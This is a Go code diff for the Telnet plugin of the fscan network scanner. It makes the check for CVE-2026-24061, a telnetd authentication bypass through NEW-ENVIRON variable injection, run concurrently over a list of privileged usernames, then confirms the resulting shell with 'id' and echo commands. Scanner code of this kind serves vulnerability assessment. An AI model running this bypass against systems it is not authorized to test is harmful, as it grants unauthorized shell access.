@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"net"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/shadow1ng/fscan/common"
@@ -84,21 +85,9 @@ func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, session 
 		creds[i] = Credential{Username: c.Username, Password: c.Password}
 	}
 
-	// CVE-2026-24061: 使用配置的用户列表检测 Telnetd Authentication Bypass 漏洞
-	cveUsers := config.Credentials.Userdict["telnet"]
-	if len(cveUsers) == 0 {
-		cveUsers = []string{"root", "admin", "administrator"}
-	}
-	for _, user := range cveUsers {
-		if vuln, cveUser, evidence := p.checkCVE202624061(ctx, info, session, user); vuln {
-			common.LogVuln(i18n.Tr("telnet_cve202624061", target, cveUser, evidence))
-			return &ScanResult{
-				Success: true,
-				Type:    plugins.ResultTypeVuln,
-				Service: "telnet",
-				Banner:  fmt.Sprintf("CVE-2026-24061 Telnetd Authentication Bypass (user: %s)", cveUser),
-			}
-		}
+	// CVE-2026-24061: 并发检测 Telnetd Authentication Bypass 漏洞
+	if cveResult := p.checkCVE202624061Concurrent(ctx, info, session, config); cveResult != nil {
+		return cveResult
 	}
 
 	// 使用公共框架进行并发凭据测试
@@ -769,6 +758,57 @@ func (p *TelnetPlugin) drainBuffer(conn net.Conn) {
 	}
 }
 
+// checkCVE202624061Concurrent 并发检测多个用户，首个命中即返回
+func (p *TelnetPlugin) checkCVE202624061Concurrent(ctx context.Context, info *common.HostInfo, session *common.ScanSession, config *common.Config) *ScanResult {
+	cveUsers := config.Credentials.Userdict["telnet"]
+	if len(cveUsers) == 0 {
+		cveUsers = []string{"root", "admin", "administrator"}
+	}
+
+	type cveHit struct {
+		user     string
+		evidence string
+	}
+
+	ctx, cancel := context.WithCancel(ctx)
+	defer cancel()
+
+	ch := make(chan cveHit, 1)
+	var wg sync.WaitGroup
+
+	for _, user := range cveUsers {
+		wg.Add(1)
+		go func(u string) {
+			defer wg.Done()
+			if vuln, cveUser, evidence := p.checkCVE202624061(ctx, info, session, u); vuln {
+				select {
+				case ch <- cveHit{user: cveUser, evidence: evidence}:
+					cancel() // 通知其他 goroutine 停止
+				default:
+				}
+			}
+		}(user)
+	}
+
+	// 等待全部完成后关闭 channel
+	go func() {
+		wg.Wait()
+		close(ch)
+	}()
+
+	if hit, ok := <-ch; ok {
+		target := info.Target()
+		common.LogVuln(i18n.Tr("telnet_cve202624061", target, hit.user, hit.evidence))
+		return &ScanResult{
+			Success: true,
+			Type:    plugins.ResultTypeVuln,
+			Service: "telnet",
+			Banner:  fmt.Sprintf("CVE-2026-24061 Telnetd Authentication Bypass (user: %s)", hit.user),
+		}
+	}
+	return nil
+}
+
 // checkCVE202624061 检测 CVE-2026-24061 Telnetd Authentication Bypass 漏洞
 // 利用 NEW-ENVIRON (option 39) 子协商注入恶意环境变量,实现认证绕过
 // 返回 (是否漏洞, 触发用户名, 证据)
@@ -895,17 +935,19 @@ func (e *cveChecker) parseIAC(data []byte) []byte {
 	return output
 }
 
-// readAll 读取连接中的所有可用数据
-func (e *cveChecker) readAll() []byte {
+// readAll 读取连接中的所有可用数据，deadline 控制等待上限
+func (e *cveChecker) readAll(timeout time.Duration) []byte {
 	var out []byte
+	_ = e.conn.SetReadDeadline(time.Now().Add(timeout))
 	for {
-		_ = e.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
 		n, err := e.conn.Read(e.buf)
-		if err != nil {
-			break
-		}
 		if n > 0 {
 			out = append(out, e.parseIAC(e.buf[:n])...)
+			// 收到数据后缩短后续等待，快速收完尾包
+			_ = e.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
+		}
+		if err != nil {
+			break
 		}
 	}
 	return out
@@ -932,10 +974,10 @@ func (e *cveChecker) extractEvidence(data string, keywords []string) string {
 }
 
 // run 执行 CVE-2026-24061 检测流程
-// 优先级: id 命令 > echo token > shell prompt 特征
+// 优先级: id 命令输出 > echo token 回显
 func (e *cveChecker) run() (bool, string, string) {
-	// 阶段 1: IAC 协商
-	_ = e.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	// 阶段 1: IAC 协商（deadline 控制，不 sleep）
+	_ = e.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 	for {
 		n, err := e.conn.Read(e.buf)
 		if err != nil {
@@ -950,35 +992,14 @@ func (e *cveChecker) run() (bool, string, string) {
 	// 协商未触发 exploit 则主动发送
 	if !e.exploitSent {
 		e.sendPayload()
-		time.Sleep(500 * time.Millisecond)
-		for {
-			_ = e.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
-			n, err := e.conn.Read(e.buf)
-			if err != nil || n == 0 {
-				break
-			}
-			e.parseIAC(e.buf[:n])
-		}
+		e.readAll(500 * time.Millisecond) // 消费协商回包
 	}
 
-	// 阶段 2: id 命令检测 (多次读取确保完整输出)
+	// 阶段 2: id 命令检测
 	_, _ = e.conn.Write([]byte("id\n"))
-	time.Sleep(1500 * time.Millisecond)
+	idOutput := string(e.readAll(2 * time.Second))
 
-	var idOutput string
-	for i := 0; i < 3; i++ {
-		part := e.readAll()
-		if len(part) > 0 {
-			idOutput += string(part)
-		}
-		if len(part) == 0 {
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-
-	// 检测 1: id 命令输出 (uid=/gid=/root/nobody)
-	evidence := e.extractEvidence(idOutput, []string{"uid=", "gid=", "root", "nobody"})
+	evidence := e.extractEvidence(idOutput, []string{"uid=", "gid="})
 	if evidence != "" {
 		return true, e.user, evidence
 	}
@@ -986,10 +1007,8 @@ func (e *cveChecker) run() (bool, string, string) {
 	// 阶段 3: echo token 验证
 	token := e.genToken()
 	_, _ = e.conn.Write([]byte("echo " + token + "\n"))
-	time.Sleep(1 * time.Second)
-
-	result := string(e.readAll())
-	stripped := strings.Replace(result, "echo "+token+"\n", "", 1)
+	result := string(e.readAll(1500 * time.Millisecond))
+	stripped := strings.Replace(result, "echo "+token, "", 1)
 	if strings.Contains(stripped, token) {
 		return true, e.user, "[echo " + token + "]"
 	}
